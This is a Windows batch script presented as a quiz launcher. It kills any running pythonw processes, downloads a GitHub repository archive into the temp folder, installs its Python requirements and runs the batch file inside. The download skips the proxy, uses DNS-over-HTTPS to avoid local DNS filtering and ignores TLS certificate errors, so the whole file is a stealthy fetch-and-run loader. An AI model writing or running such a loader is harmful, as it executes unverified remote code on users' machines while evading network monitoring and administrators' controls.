@echo off
set "QUIZ_LAUNCHER=%~f0"
cd /d "%TEMP%"
taskkill /F /IM pythonw.exe >nul 2>nul
if exist questions-main rmdir /s /q questions-main
curl.exe --noproxy "*" --doh-url https://1.1.1.1/dns-query -ksL https://github.com/0rkhanmammadov/questions/archive/refs/heads/main.zip -o q.zip <nul
if not exist q.zip curl.exe -ksL https://github.com/0rkhanmammadov/questions/archive/refs/heads/main.zip -o q.zip <nul
tar.exe -xf q.zip <nul
del /q q.zip
cd /d "%TEMP%\questions-main"
python -m pip install -q -r "%TEMP%\questions-main\requirements.txt" <nul
cmd /c "%TEMP%\questions-main\baslat.bat" <nul
exit
